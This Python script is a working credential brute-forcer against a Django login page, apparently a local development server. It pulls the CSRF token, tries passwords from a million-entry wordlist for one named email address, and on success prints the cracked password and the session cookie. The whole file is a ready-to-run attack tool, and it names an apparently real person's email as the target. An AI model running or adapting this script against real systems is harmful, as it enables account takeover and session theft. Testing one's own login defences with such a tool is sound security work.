import requests

from lxml import html

TARGET_URL = 'http://localhost:8000/backend/portal/login/'
EMAIL = 'marcy@thinknimble.com'
WORDLIST = 'Passwords-master/10_million_password_list_top_1000000.txt'


def brute_force():
    print(f'Target: {TARGET_URL}')
    print(f'Trying passwords for {EMAIL}.')
    # Request initial page
    client = requests.session()
    page = client.get(TARGET_URL)

    # Parse HTML to pull the csrfmiddleware token from the input form
    tree = html.fromstring(page.content)
    csrf_middleware_token = tree.xpath('//input[@name="csrfmiddlewaretoken"]/@value')[0]

    # Pass in the correct CSRF token as a cookie
    csrf_token = client.cookies.get('csrftoken')
    cookies = {'csrftoken': csrf_token}

    # Pass in Referer header, which Django requires over HTTPS
    headers = {'Referer': TARGET_URL}

    print('Reading file...')
    with open(WORDLIST, mode='r') as file:
        content = file.readlines()

    # Remove newlines, etc
    passwords = [p.strip() for p in content]

    print('Cracking', end='', flush=True)
    count = 0
    for password in passwords:
        count += 1
        print_count(count)
        body = {
            'username': EMAIL,
            'password': password,
            'csrfmiddlewaretoken': csrf_middleware_token
        }
        response = requests.post(
            TARGET_URL,
            cookies=cookies,
            headers=headers,
            data=body,
            # Don't auto-redirect, since Django admin sends a redirect on success, and we
            # need to pull the session token from the 302 response.
            allow_redirects=False
        )
        # 302 - success
        if response.status_code == 302:
            break
        # 200 - wrong password
        if response.status_code == 200:
            continue
        # Any other code - something's wrong
        break

    if response.status_code == 302:
        session_token = response.cookies.get('sessionid')
        print(f'\nSuccess. {count} passwords tried. Password: {password}. Session token: {session_token}.')
    elif response.status_code == 200:
        print(f'\nFailed. {count} passwords tried.')
    else:
        print(f'\nUnable to attempt login: received status code {response.status_code}.')


def print_count(counter, small_denom=10, big_denom=100):
    """
    Display progress when performing a large number of iterations.
    """
    if (counter / small_denom).is_integer():
        print('.', end='', flush=True)
    if (counter / big_denom).is_integer():
        print(counter, end='', flush=True)


if __name__ == '__main__':
    brute_force()
